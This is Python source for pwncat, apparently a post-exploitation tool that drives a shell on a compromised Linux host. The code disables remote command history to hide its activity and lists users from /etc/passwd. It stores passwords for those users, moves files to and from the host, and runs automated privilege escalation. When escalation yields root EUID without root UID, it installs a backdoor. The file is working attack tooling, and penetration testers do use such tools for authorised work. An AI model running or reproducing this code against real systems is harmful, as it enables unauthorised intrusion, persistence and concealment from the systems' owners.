#!/usr/bin/env python3
from typing import Dict, Optional, Iterable
from prompt_toolkit import PromptSession, ANSI
from prompt_toolkit.shortcuts import ProgressBar
from prompt_toolkit.completion import (
    Completer,
    PathCompleter,
    Completion,
    CompleteEvent,
    NestedCompleter,
    WordCompleter,
    merge_completers,
)
from prompt_toolkit.document import Document
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.lexers import PygmentsLexer
from functools import wraps
import subprocess
import requests
import tempfile
import logging
import argparse
import base64
import time
import socket
import enum
import shlex
import sys
import os
import re

from pwncat import util
from pwncat import downloader, uploader, privesc
from pwncat.file import RemoteBinaryPipe
from pwncat.lexer import LocalCommandLexer, PwncatStyle

from colorama import Fore


class State(enum.Enum):
    """ The current PtyHandler state """

    NORMAL = enum.auto()
    RAW = enum.auto()
    COMMAND = enum.auto()


def with_parser(f):
    @wraps(f)
    def _decorator(self, argv):
        try:
            parser = getattr(self, f.__name__.split("do_")[1] + "_parser")
            args = parser.parse_args(argv)
        except SystemExit:
            return
        return f(self, args)

    return _decorator


class RemotePathCompleter(Completer):
    def __init__(self, pty: "PtyHandler"):
        self.pty = pty

    def get_completions(self, document: Document, complete_event: CompleteEvent):

        before = document.text_before_cursor.split()[-1]
        path, partial_name = os.path.split(before)

        if path == "":
            path = "."

        delim = self.pty.process(f"ls -1 -a {shlex.quote(path)}", delim=True)

        name = self.pty.recvuntil(b"\n").strip()
        while name != delim:
            name = name.decode("utf-8")
            if name.startswith(partial_name):
                yield Completion(
                    name,
                    start_position=-len(partial_name),
                    display=[("#ff0000", "(remote)"), ("", f" {name}")],
                )
            name = self.pty.recvuntil(b"\n").strip()


class LocalPathCompleter(Completer):
    def __init__(self, pty: "PtyHandler"):
        self.pty = pty

    def get_completions(self, document: Document, complete_event: CompleteEvent):

        before = document.text_before_cursor.split()[-1]
        path, partial_name = os.path.split(before)

        if path == "":
            path = "."

        # Ensure the directory exists
        if not os.path.isdir(path):
            return

        for name in os.listdir(path):
            if name.startswith(partial_name):
                yield Completion(
                    name,
                    start_position=-len(partial_name),
                    display=[("fg:ansiyellow", "(local)"), ("", f" {name}")],
                )


class CommandCompleter(Completer):
    def __init__(self, description):
        self.description = description

    def get_completions(
        self, document: Document, complete_event: CompleteEvent
    ) -> Iterable[Completion]:
        # Split document.
        text = document.text_before_cursor.lstrip()
        stripped_len = len(document.text_before_cursor) - len(text)

        # If there is a space, check for the first term, and use a
        # subcompleter.
        if " " in text:
            first_term = text.split()[0]
            command = self.description.get(first_term)

            # If we have a sub completer, use this for the completions.
            if command is not None:
                options = [k for k in command if k != "positional"]
                terms = text.split(" ")

                if len(terms) > 2:
                    prev_term = terms[-2]
                else:
                    prev_term = None

                if prev_term in options:
                    completer = command[prev_term]
                else:
                    positionals = command.get("positional", [])
                    completer = merge_completers(
                        [WordCompleter(options, ignore_case=False)] + positionals
                    )

                for c in completer.get_completions(document, complete_event):
                    yield c

        # No space in the input: behave exactly like `WordCompleter`.
        else:
            completer = WordCompleter(list(self.description.keys()), ignore_case=False)
            for c in completer.get_completions(document, complete_event):
                yield c


class PtyHandler:
    """ Handles creating the pty on the remote end and locally processing input
    on the local end """

    OPEN_METHODS = {
        "script": "exec {} -qc {} /dev/null 2>&1",
        "python": "exec {} -c \"import pty; pty.spawn('{}')\" 2>&1",
    }

    INTERESTING_BINARIES = [
        "python",
        "python2",
        "python3",
        "perl",
        "bash",
        "dash",
        "zsh",
        "sh",
        "curl",
        "wget",
        "nc",
        "netcat",
        "ncat",
        "script",
    ]

    def __init__(self, client: socket.SocketType, has_pty: bool = False):
        """ Initialize a new Pty Handler. This will handle creating the PTY and
        setting the local terminal to raw. It also maintains the state to open a
        local terminal if requested and exit raw mode. """

        self.client = client
        self.state = "normal"
        self.saved_term_state = None
        self.input = b""
        self.lhost = None
        self.known_binaries = {}
        self.known_users = {}
        self.vars = {"lhost": util.get_ip_addr()}
        self.remote_prefix = "\\[\\033[01;31m\\](remote)\\033[00m\\]"
        self.remote_prompt = (
            "\\[\\033[01;33m\\]\\u@\\h\\[\\033[00m\\]:\\["
            "\\033[01;36m\\]\\w\\[\\033[00m\\]\\$ "
        )
        self.prompt = self.build_prompt_session()
        self.has_busybox = False
        self.busybox_path = None
        self.binary_aliases = {
            "python": [
                "python2",
                "python3",
                "python2.7",
                "python3.6",
                "python3.8",
                "python3.9",
            ],
            "sh": ["bash", "zsh", "dash"],
            "nc": ["netcat", "ncat"],
        }
        self.has_pty = has_pty

        # Setup the argument parsers for local the local prompt
        self.setup_command_parsers()

        # We should always get a response within 3 seconds...
        self.client.settimeout(1)

        util.info("probing for prompt...", overlay=True)
        start = time.time()
        prompt = b""
        try:
            while time.time() < (start + 0.1):
                prompt += self.client.recv(1)
        except socket.timeout:
            pass

        # We assume if we got data before sending data, there is a prompt
        if prompt != b"":
            self.has_prompt = True
            util.info(f"found a prompt", overlay=True)
        else:
            self.has_prompt = False
            util.info("no prompt observed", overlay=True)

        # Send commands without a new line, and see if the characters are echoed
        util.info("checking for echoing", overlay=True)
        test_cmd = b"echo"
        self.client.send(test_cmd)
        response = b""

        try:
            while len(response) < len(test_cmd):
                response += self.client.recv(len(test_cmd) - len(response))
        except socket.timeout:
            pass

        if response == test_cmd:
            self.has_echo = True
            util.info("found input echo", overlay=True)
        else:
            self.has_echo = False
            util.info(f"no echo observed", overlay=True)

        self.client.send(b"\n")
        response = self.client.recv(1)
        if response == "\r":
            self.client.recv(1)
            self.has_cr = True
        else:
            self.has_cr = False

        if self.has_echo:
            self.recvuntil(b"\n")

        # Ensure history is disabled
        util.info("disabling remote command history", overlay=True)
        self.run("unset HISTFILE; export HISTCONTROL=ignorespace")

        util.info("setting terminal prompt", overlay=True)
        self.run("unset PROMPT_COMMAND")
        self.run(f'export PS1="{self.remote_prefix} {self.remote_prompt}"')

        self.shell = self.run("ps -o command -p $$ | tail -n 1").decode("utf-8").strip()
        self.shell = self.which(self.shell.split(" ")[0])
        util.info(f"running in {Fore.BLUE}{self.shell}{Fore.RESET}")

        # Locate interesting binaries
        # The auto-resolving doesn't work correctly until we have a pty
        # so, we manually resolve a list of useful binaries prior to spawning
        # a pty
        for name in PtyHandler.INTERESTING_BINARIES:
            util.info(
                f"resolving remote binary: {Fore.YELLOW}{name}{Fore.RESET}",
                overlay=True,
            )

            # Look for the given binary
            response = self.run(f"which {shlex.quote(name)}").strip()
            if response == b"":
                continue

            self.known_binaries[name] = response.decode("utf-8")

        # Now, we can resolve using `which` w/ request=False for the different
        # methods
        for m, cmd in PtyHandler.OPEN_METHODS.items():
            if self.which(m, request=False) is not None:
                method_cmd = cmd.format(self.which(m, request=False), self.shell)
                method = m
                break
        else:
            util.error("no available methods to spawn a pty!")
            raise RuntimeError("no available methods to spawn a pty!")

        # Open the PTY
        util.info(
            f"opening pseudoterminal via {Fore.GREEN}{method}{Fore.RESET}", overlay=True
        )
        self.run(method_cmd, wait=False)
        # client.sendall(method_cmd.encode("utf-8") + b"\n")

        # We just started a PTY, so we now have all three
        self.has_echo = True
        self.has_cr = True
        self.has_prompt = True

        util.info("setting terminal prompt", overlay=True)
        self.run("unset PROMPT_COMMAND")
        self.run(f'export PS1="{self.remote_prefix} {self.remote_prompt}"')

        # Make sure HISTFILE is unset in this PTY (it resets when a pty is
        # opened)
        self.run("unset HISTFILE; export HISTCONTROL=ignorespace")

        # Disable automatic margins, which fuck up the prompt
        self.run("tput rmam")

        # Synchronize the terminals
        util.info("synchronizing terminal state", overlay=True)
        self.do_sync([])

        self.privesc = privesc.Finder(self)

        # Attempt to identify architecture
        self.arch = self.run("uname -m").decode("utf-8").strip()

        # Force the local TTY to enter raw mode
        self.enter_raw()

    def bootstrap_busybox(self, url, method):
        """ Utilize the architecture we grabbed from `uname -m` to grab a
        precompiled busybox binary and upload it to the remote machine. This
        makes uploading/downloading and dependency tracking easier. It also
        makes file upload/download safer, since we have a known good set of 
        commands we can run (rather than relying on GTFObins) """

        if self.has_busybox:
            util.success("busybox is already available!")
            return

        busybox_remote_path = self.which("busybox")

        if busybox_remote_path is None:

            # We use the stable busybox version at the time of writing. This should
            # probably be configurable.
            busybox_url = url.rstrip("/") + "/busybox-{arch}"

            # Attempt to download the busybox binary
            r = requests.get(busybox_url.format(arch=self.arch), stream=True)

            # No busybox support
            if r.status_code == 404:
                util.warn(f"no busybox for architecture: {self.arch}")
                return

            with ProgressBar(f"downloading busybox for {self.arch}") as pb:
                counter = pb(int(r.headers["Content-Length"]))
                with tempfile.NamedTemporaryFile("wb", delete=False) as filp:
                    last_update = time.time()
                    busybox_local_path = filp.name
                    for chunk in r.iter_content(chunk_size=1024 * 1024):
                        filp.write(chunk)
                        counter.items_completed += len(chunk)
                        if (time.time() - last_update) > 0.1:
                            pb.invalidate()
                    counter.stopped = True
                    pb.invalidate()
                    time.sleep(0.1)

            # Stage a temporary file for busybox
            busybox_remote_path = (
                self.run("mktemp -t busyboxXXXXX").decode("utf-8").strip()
            )

            # Upload busybox using the best known method to the remote server
            self.do_upload(
                ["-m", method, "-o", busybox_remote_path, busybox_local_path]
            )

            # Make busybox executable
            self.run(f"chmod +x {shlex.quote(busybox_remote_path)}")

            # Remove local busybox copy
            os.unlink(busybox_local_path)

            util.success(
                f"uploaded busybox to {Fore.GREEN}{busybox_remote_path}{Fore.RESET}"
            )

        else:
            # Busybox was provided on the system!
            util.success(f"busybox already installed on remote system!")

        # Check what this busybox provides
        util.progress("enumerating provided applets")
        pipe = self.subprocess(f"{shlex.quote(busybox_remote_path)} --list")
        provides = pipe.read().decode("utf-8").strip().split("\n")
        pipe.close()

        # prune any entries which the system marks as SETUID or SETGID
        stat = self.which("stat", quote=True)

        if stat is not None:
            util.progress("enumerating remote binary permissions")
            which_provides = [f"`which {p}`" for p in provides]
            permissions = (
                self.run(f"{stat} -c %A {' '.join(which_provides)}")
                .decode("utf-8")
                .strip()
                .split("\n")
            )
            new_provides = []
            for name, perms in zip(provides, permissions):
                if "No such" in perms:
                    # The remote system doesn't have this binary
                    continue
                if "s" not in perms.lower():
                    util.progress(f"keeping {Fore.BLUE}{name}{Fore.RESET} in busybox")
                    new_provides.append(name)
                else:
                    util.progress(f"pruning {Fore.RED}{name}{Fore.RESET} from busybox")

            util.success(f"pruned {len(provides)-len(new_provides)} setuid entries")
            provides = new_provides

        # Let the class know we now have access to busybox
        self.busybox_provides = provides
        self.has_busybox = True
        self.busybox_path = busybox_remote_path

    def build_prompt_session(self):
        """ This is kind of gross because of the nested completer, so I broke
        it out on it's own. The nested completer must be updated separately
        whenever a new command or a command argument is changed. """

        remote_completer = RemotePathCompleter(self)
        local_completer = LocalPathCompleter(self)
        download_method_completer = WordCompleter(downloader.get_names())
        upload_method_completer = WordCompleter(uploader.get_names())

        completer_graph = {
            "download": {
                "-m": download_method_completer,
                "--method": download_method_completer,
                "-o": local_completer,
                "--output": local_completer,
                "positional": [remote_completer],
            },
            "upload": {
                "-m": upload_method_completer,
                "--method": upload_method_completer,
                "-o": remote_completer,
                "--output": remote_completer,
                "positional": [local_completer],
            },
            "back": None,
            "sync": None,
            "help": None,
        }

        return PromptSession(
            [
                ("fg:ansiyellow bold", "(local) "),
                ("fg:ansimagenta bold", "pwncat"),
                ("", "$ "),
            ],
            completer=CommandCompleter(completer_graph),
            auto_suggest=AutoSuggestFromHistory(),
            lexer=PygmentsLexer(LocalCommandLexer),
            style=PwncatStyle,
        )

    def which(self, name: str, request=True, quote=False) -> str:
        """ Call which on the remote host and return the path. The results are
        cached to decrease the number of remote calls. """
        path = None

        if self.has_busybox:
            if name in self.busybox_provides:
                if quote:
                    return f"{shlex.quote(self.busybox_path)} {name}"
                else:
                    return f"{self.busybox_path} {name}"

        if name in self.known_binaries and self.known_binaries[name] is not None:
            # Cached value available
            path = self.known_binaries[name]
        elif name not in self.known_binaries and request:
            # It hasn't been looked up before, request it.
            path = self.run(f"which {shlex.quote(name)}").decode("utf-8").strip()
            if path == "":
                path = None

        if name in self.binary_aliases and path is None:
            # Look for aliases of this command as a last resort
            for alias in self.binary_aliases[name]:
                path = self.which(alias, quote=False)
                if path is not None:
                    break

        # Cache the value
        self.known_binaries[name] = path

        if quote:
            path = shlex.quote(path)

        return path

    def process_input(self, data: bytes):
        r""" Process a new byte of input from stdin. This is to catch "\r~C" and open
        a local prompt """

        # Send the new data to the client
        self.client.send(data)

        # Only process data following a new line
        if data == b"\r":
            self.input = data
        elif len(data) == 0:
            return
        else:
            self.input += data

        if self.input == b"\r~C":
            # Erase the current line on the remote host ("~C")
            # This is 2 backspace characters
            self.client.send(b"\x08" * 2 + b"\r")
            # Start processing local commands
            self.enter_command()
        elif len(self.input) >= 3:
            # Our only escapes are 3 characters (include the newline)
            self.input = b""

    def recv(self) -> bytes:
        """ Recieve data from the client """
        return self.client.recv(4096)

    def enter_raw(self, save: bool = True):
        """ Enter raw mode on the local terminal """
        old_term_state = util.enter_raw_mode()

        self.state = State.RAW

        # Save the state if requested
        if save:
            self.saved_term_state = old_term_state

    def enter_command(self):
        """ Enter commmand mode. This sets normal mode and uses prompt toolkit
        process commands from the user for the local machine """

        # Go back to normal mode
        self.restore()
        self.state = State.COMMAND

        # Hopefully this fixes weird cursor position issues
        sys.stdout.write("\n")

        # Process commands
        while self.state is State.COMMAND:
            try:
                try:
                    line = self.prompt.prompt()
                except (EOFError, OSError):
                    # The user pressed ctrl-d, go back
                    self.enter_raw()
                    continue

                if len(line) > 0:
                    if line[0] == "!":
                        # Allow running shell commands
                        subprocess.run(line[1:], shell=True)
                        continue
                    elif line[0] == "@":
                        result = self.run(line[1:])
                        sys.stdout.buffer.write(result)
                        continue
                    elif line[0] == "-":
                        self.run(line[1:], wait=False)
                        continue

                try:
                    argv = shlex.split(line)
                except ValueError as e:
                    util.error(e.args[0])
                    continue

                # Empty command
                if len(argv) == 0:
                    continue

                try:
                    method = getattr(self, f"do_{argv[0]}")
                except AttributeError:
                    util.warn(f"{argv[0]}: command does not exist")
                    continue

                # Call the method
                method(argv[1:])
            except KeyboardInterrupt:
                continue

    @with_parser
    def do_busybox(self, args):
        """ Attempt to upload a busybox binary which we can use as a consistent 
        interface to local functionality """

        if args.action == "list":
            if not self.has_busybox:
                util.error("busybox hasn't been installed yet (hint: run 'busybox'")
                return
            util.info("binaries which the remote busybox provides:")
            for name in self.busybox_provides:
                print(f" * {name}")
        elif args.action == "status":
            if not self.has_busybox:
                util.error("busybox hasn't been installed yet")
                return
            util.info(
                f"busybox is installed to: {Fore.BLUE}{self.busybox_path}{Fore.RESET}"
            )
            util.info(
                f"busybox provides {Fore.GREEN}{len(self.busybox_provides)}{Fore.RESET} applets"
            )
        elif args.action == "install":
            self.bootstrap_busybox(args.url, args.method)

    @with_parser
    def do_back(self, _):
        """ Exit command mode """
        self.enter_raw(save=False)

    def do_privesc(self, argv):
        """ Attempt privilege escalation """

        parser = argparse.ArgumentParser(prog="privesc")
        parser.add_argument(
            "--list",
            "-l",
            action="store_true",
            help="do not perform escalation. list potential escalation methods",
        )
        parser.add_argument(
            "--all",
            "-a",
            action="store_const",
            dest="user",
            const=None,
            help="when listing methods, list for all users. when escalating, escalate to root.",
        )
        parser.add_argument(
            "--user",
            "-u",
            choices=[user for user in self.users],
            default="root",
            help="the target user",
        )
        parser.add_argument(
            "--max-depth",
            "-m",
            type=int,
            default=None,
            help="Maximum depth for the privesc search (default: no maximum)",
        )
        parser.add_argument(
            "--read",
            "-r",
            type=str,
            default=None,
            help="remote filename to try and read",
        )
        parser.add_argument(
            "--write",
            "-w",
            type=str,
            default=None,
            help="attempt to write to a remote file as the specified user",
        )
        parser.add_argument(
            "--data",
            "-d",
            type=str,
            default=None,
            help="the data to write a file. ignored if not write mode",
        )
        parser.add_argument(
            "--text",
            "-t",
            action="store_true",
            default=False,
            help="whether to use safe readers/writers",
        )

        try:
            args = parser.parse_args(argv)
        except SystemExit:
            # The arguments were parsed incorrectly, return.
            return

        if args.list:
            techniques = self.privesc.search(args.user)
            if len(techniques) == 0:
                util.warn("no techniques found")
            else:
                for tech in techniques:
                    util.info(f" - {tech}")
        elif args.read:
            try:
                read_pipe, chain = self.privesc.read_file(
                    args.read, args.user, args.max_depth
                )

                # Read the data from the pipe
                sys.stdout.buffer.write(read_pipe.read(4096))
                read_pipe.close()

                # Unwrap in case we had to privesc to get here
                self.privesc.unwrap(chain)

            except privesc.PrivescError as exc:
                util.error(f"read file failed: {exc}")
        elif args.write:
            if args.data is None:
                util.error("no data specified")
            else:
                if args.data.startswith("@"):
                    with open(args.data[1:], "rb") as f:
                        data = f.read()
                else:
                    data = args.data.encode("utf-8")
                try:
                    chain = self.privesc.write_file(
                        args.write,
                        data,
                        safe=not args.text,
                        target_user=args.user,
                        depth=args.max_depth,
                    )
                    self.privesc.unwrap(chain)
                    util.success("file written successfully!")
                except privesc.PrivescError as exc:
                    util.error(f"file write failed: {exc}")
        else:
            try:
                chain = self.privesc.escalate(args.user, args.max_depth)

                ident = self.id
                backdoor = False
                if ident["euid"]["id"] == 0 and ident["uid"]["id"] != 0:
                    util.progress(
                        "EUID != UID. installing backdoor to complete privesc"
                    )
                    try:
                        self.privesc.add_backdoor()
                        backdoor = True
                    except privesc.PrivescError as exc:
                        util.warn(f"backdoor installation failed: {exc}")

                util.success("privilege escalation succeeded using:")
                for i, (technique, _) in enumerate(chain):
                    arrow = f"{Fore.YELLOW}\u2ba1{Fore.RESET} "
                    print(f"{(i+1)*' '}{arrow}{technique}")

                if backdoor:
                    print(
                        (
                            f"{(len(chain)+1)*' '}{arrow}"
                            f"{Fore.YELLOW}pwncat{Fore.RESET} backdoor"
                        )
                    )

                self.reset()
                self.do_back([])
            except privesc.PrivescError as exc:
                util.error(f"escalation failed: {exc}")

    @with_parser
    def do_download(self, args):
        """ Download a file from the remote host """

        try:
            # Locate an appropriate downloader class
            DownloaderClass = downloader.find(self, args.method)
        except downloader.DownloadError as exc:
            util.error(f"{exc}")
            return

        # Grab the arguments
        path = args.path
        basename = os.path.basename(args.path)
        outfile = args.output.format(basename=basename)

        download = DownloaderClass(self, remote_path=path, local_path=outfile)

        # Get the remote file size
        size = self.run(f'stat -c "%s" {shlex.quote(path)} 2>/dev/null || echo "none"')
        if b"none" in size:
            util.error(f"{path}: no such file or directory")
            return
        size = int(size)

        with ProgressBar(
            [("#888888", "downloading with "), ("fg:ansiyellow", f"{download.NAME}")]
        ) as pb:
            counter = pb(range(size))
            last_update = time.time()

            def on_progress(copied, blocksz):
                """ Update the progress bar """
                if blocksz == -1:
                    counter.stopped = True
                    counter.done = True
                    pb.invalidate()
                    return

                counter.items_completed += blocksz
                if counter.items_completed >= counter.total:
                    counter.done = True
                    counter.stopped = True
                if (time.time() - last_update) > 0.1:
                    pb.invalidate()

            try:
                download.serve(on_progress)
                if download.command():
                    while not counter.done:
                        time.sleep(0.2)
            finally:
                download.shutdown()

            # https://github.com/prompt-toolkit/python-prompt-toolkit/issues/964
            time.sleep(0.1)

    @with_parser
    def do_upload(self, args):
        """ Upload a file to the remote host """

        if not os.path.isfile(args.path):
            util.error(f"{args.path}: no such file or directory")
            return

        try:
            # Locate an appropriate downloader class
            UploaderClass = uploader.find(self, args.method)
        except uploader.UploadError as exc:
            util.error(f"{exc}")
            return

        path = args.path
        basename = os.path.basename(args.path)
        name = basename
        outfile = args.output.format(basename=basename)

        upload = UploaderClass(self, remote_path=outfile, local_path=path)

        with ProgressBar(
            [("#888888", "uploading via "), ("fg:ansiyellow", f"{upload.NAME}")]
        ) as pb:

            counter = pb(range(os.path.getsize(path)))
            last_update = time.time()

            def on_progress(copied, blocksz):
                """ Update the progress bar """
                counter.items_completed += blocksz
                if counter.items_completed >= counter.total:
                    counter.done = True
                    counter.stopped = True
                if (time.time() - last_update) > 0.1:
                    pb.invalidate()

            upload.serve(on_progress)
            upload.command()

            try:
                while not counter.done:
                    time.sleep(0.1)
            except KeyboardInterrupt:
                pass
            finally:
                upload.shutdown()

            # https://github.com/prompt-toolkit/python-prompt-toolkit/issues/964
            time.sleep(0.1)

    def do_sync(self, argv):
        """ Synchronize the remote PTY with the local terminal settings """

        TERM = os.environ.get("TERM", "xterm")
        columns, rows = os.get_terminal_size(0)

        self.run(f"stty rows {rows}; stty columns {columns}; export TERM='{TERM}'")

    def do_set(self, argv):
        """ Set or view the currently assigned variables """

        if len(argv) == 0:
            util.info("local variables:")
            for k, v in self.vars.items():
                print(f" {k} = {shlex.quote(v)}")

            util.info("user passwords:")
            for user, data in self.users.items():
                if data["password"] is not None:
                    print(
                        f" {Fore.GREEN}{user}{Fore.RESET} -> {Fore.CYAN}{shlex.quote(data['password'])}{Fore.RESET}"
                    )
            return

        parser = argparse.ArgumentParser(prog="set")
        parser.add_argument(
            "--password",
            "-p",
            action="store_true",
            help="set the password for the given user",
        )
        parser.add_argument("variable", help="the variable name or user")
        parser.add_argument("value", help="the new variable/user password value")

        try:
            args = parser.parse_args(argv)
        except SystemExit:
            # The arguments were parsed incorrectly, return.
            return

        if args.password is not None and args.variable not in self.users:
            util.error(f"{args.variable}: no such user")
        elif args.password is not None:
            self.users[args.variable]["password"] = args.value
        else:
            self.vars[args.variable] = args.value

    def do_help(self, argv):
        """ View help for local commands """

        if len(argv) == 0:
            commands = [x for x in dir(self) if x.startswith("do_")]
        else:
            commands = [x for x in dir(self) if x.startswith("do_") and x[3:] in argv]

        for c in commands:
            help_msg = getattr(self, c).__doc__
            print(f"{c[3:]:15s}{help_msg}")

    def do_reset(self, argv):
        """ Reset the remote terminal (calls sync, reset, and sets PS1) """
        self.reset()
        self.do_sync([])

    def run(self, cmd, wait=True, input: bytes = b"") -> bytes:
        """ Run a command in the context of the remote host and return the
        output. This is run synchrounously.

            :param cmd: The command to run. Either a string or an argv list.
            :param has_pty: Whether a pty was spawned
        """

        response = self.process(cmd, delim=wait)
        if callable(input):
            input()
        else:
            self.client.send(input)

        if wait:

            response = self.recvuntil(b"_PWNCAT_ENDDELIM_")
            response = response.split(b"_PWNCAT_ENDDELIM_")[0]
            if b"_PWNCAT_STARTDELIM_" in response:
                response = b"\n".join(response.split(b"\n")[1:])

            if self.has_cr:
                self.recvuntil(b"\r\n")
            else:
                self.recvuntil(b"\n")

        return response

    def process(self, cmd, delim=True) -> bytes:
        """ Run a command in the context of the remote host and return the
        output. This is run synchrounously.

            :param cmd: The command to run. Either a string or an argv list.
            :param has_pty: Whether a pty was spawned
        """

        if isinstance(cmd, list):
            cmd = shlex.join(cmd)

        if delim:
            command = f" echo _PWNCAT_STARTDELIM_; {cmd}; echo _PWNCAT_ENDDELIM_"
        else:
            command = f" {cmd}"

        response = b""
        eol = b"\r"
        if self.has_cr:
            eol = b"\r"

        # Send the command to the remote host
        self.client.send(command.encode("utf-8") + b"\n")

        if delim:
            if self.has_echo:
                # Recieve line ending from output
                # print(1, self.recvuntil(b"_PWNCAT_STARTDELIM_"))
                self.recvuntil(b"\n", interp=True)

            self.recvuntil(b"_PWNCAT_STARTDELIM_", interp=True)
            self.recvuntil(b"\n", interp=True)

        return b"_PWNCAT_ENDDELIM_"

    def subprocess(self, cmd) -> RemoteBinaryPipe:
        """ Create an asynchronous child on the remote end and return a
        file-like object which can communicate with it's standard output. The 
        remote terminal is placed in raw mode with no-echo first, and the
        command is run on a separate background shell w/ no standard input. The
        output of the command can be retrieved through the returned file-like
        object. You **must** either call `close()` of the pipe, or read until
        eof, or the PTY will not be restored to a normal state.

        If `close()` is called prior to EOF, the remote process will be killed,
        and any remaining output will be flushed prior to resetting the terminal.
        """

        if isinstance(cmd, list):
            cmd = shlex.join(cmd)

        sdelim = "_PWNCAT_STARTDELIM_"
        edelim = "_PWNCAT_ENDDELIM_"

        # List of ";" separated commands that will be run
        command = []
        # Clear the prompt, or it will get displayed in our output due to the
        # background task
        command.append("export PS1=")
        # Needed to disable job control messages in bash
        command.append("set +m")
        # This is gross, but it allows us to recieve stderr and stdout, while
        # ignoring the job control start message.
        command.append(
            f"{{ echo {sdelim}; {cmd} && echo {edelim} || echo {edelim} 2>&1 & }} 2>/dev/null"
        )
        # Re-enable normal job control in bash
        command.append("set -m")

        # Join them all into one command
        command = ";".join(command).encode("utf-8")

        # Enter raw mode w/ no echo on the remote terminal
        # DANGER
        self.raw(echo=False)
        self.run("echo")  # restabilize the shell to get output

        self.client.sendall(command + b"\n")
        self.recvuntil(sdelim)
        self.recvuntil("\n")

        return RemoteBinaryPipe(self, edelim.encode("utf-8"), True)

    def raw(self, echo: bool = False):
        self.run("stty raw -echo", wait=False)
        self.has_cr = False
        self.has_echo = False

    def reset(self):
        self.run("reset", wait=False)
        self.has_cr = True
        self.has_echo = True
        self.run(f"export PS1='{self.remote_prefix} {self.remote_prompt}'")
        self.run(f"tput rmam")

    def recvuntil(self, needle: bytes, flags=0, interp=False):
        """ Recieve data from the client until the specified string appears """

        if isinstance(needle, str):
            needle = needle.encode("utf-8")

        result = b""
        while not result.endswith(needle):
            try:
                data = self.client.recv(1, flags)
                # Bash sends some **WEIRD** shit and wraps it in backspace
                # characters for some reason. When asked, we interpret the
                # backspace characters so the response is what we expect.
                if interp and data == b"\x08":
                    if len(result) > 0:
                        result = result[:-1]
                else:
                    result += data
            except socket.timeout:
                continue  # force waiting

        return result

    def restore(self):
        """ Restore the terminal state """
        util.restore_terminal(self.saved_term_state)
        self.state = State.NORMAL

    def setup_command_parsers(self):
        """ Setup the argparsers for the different local commands """

        self.upload_parser = argparse.ArgumentParser(prog="upload")
        self.upload_parser.add_argument(
            "--method",
            "-m",
            choices=["", *uploader.get_names()],
            default=None,
            help="set the download method (default: auto)",
        )
        self.upload_parser.add_argument(
            "--output",
            "-o",
            default="./{basename}",
            help="path to the output file (default: basename of input)",
        )
        self.upload_parser.add_argument("path", help="path to the file to upload")

        self.download_parser = argparse.ArgumentParser(prog="download")
        self.download_parser.add_argument(
            "--method",
            "-m",
            choices=downloader.get_names(),
            default=None,
            help="set the download method (default: auto)",
        )
        self.download_parser.add_argument(
            "--output",
            "-o",
            default="./{basename}",
            help="path to the output file (default: basename of input)",
        )
        self.download_parser.add_argument("path", help="path to the file to download")

        self.back_parser = argparse.ArgumentParser(prog="back")

        self.busybox_parser = argparse.ArgumentParser(prog="busybox")
        self.busybox_parser.add_argument(
            "--method",
            "-m",
            choices=uploader.get_names(),
            default="",
            help="set the upload method (default: auto)",
        )
        self.busybox_parser.add_argument(
            "--url",
            "-u",
            default=(
                "https://busybox.net/downloads/binaries/"
                "1.31.0-defconfig-multiarch-musl/"
            ),
            help=(
                "url to download multiarch busybox binaries"
                "(default: 1.31.0-defconfig-multiarch-musl)"
            ),
        )
        group = self.busybox_parser.add_mutually_exclusive_group(required=True)
        group.add_argument(
            "--install",
            "-i",
            action="store_const",
            dest="action",
            const="install",
            default="install",
            help="install busybox support for pwncat",
        )
        group.add_argument(
            "--list",
            "-l",
            action="store_const",
            dest="action",
            const="list",
            help="list all provided applets from the remote busybox",
        )
        group.add_argument(
            "--status",
            "-s",
            action="store_const",
            dest="action",
            const="status",
            help="show current pwncat busybox status",
        )

    def whoami(self):
        result = self.run("whoami")
        return result.strip().decode("utf-8")

    @property
    def id(self):

        id_output = self.run("id").decode("utf-8")

        pieces = id_output.split(" ")
        props = {}
        for p in pieces:
            segments = p.split("=")
            props[segments[0]] = segments[1]

        id_properties = {}
        for key, value in props.items():
            if key == "groups":
                groups = []
                for group in value.split(","):
                    p = group.split("(")
                    groups.append({"id": int(p[0]), "name": p[1].split(")")[0]})
                id_properties["groups"] = groups
            else:
                p = value.split("(")
                id_properties[key] = {"id": int(p[0]), "name": p[1].split(")")[0]}

        if "euid" not in id_properties:
            id_properties["euid"] = id_properties["uid"]

        if "egid" not in id_properties:
            id_properties["egid"] = id_properties["gid"]

        return id_properties

    def reload_users(self):
        """ Clear user cache and reload it """
        self.known_users = None
        return self.users

    @property
    def users(self):
        if self.known_users:
            return self.known_users

        self.known_users = {}

        passwd = self.run("cat /etc/passwd").decode("utf-8")
        for line in passwd.split("\n"):
            line = line.strip()
            if line == "":
                continue
            line = line.strip().split(":")

            user_data = {
                "name": line[0],
                "password": None,
                "uid": int(line[2]),
                "gid": int(line[3]),
                "description": line[4],
                "home": line[5],
                "shell": line[6],
            }
            self.known_users[line[0]] = user_data

        return self.known_users

    @property
    def current_user(self):
        name = self.whoami()
        if name in self.users:
            return self.users[name]
        return None
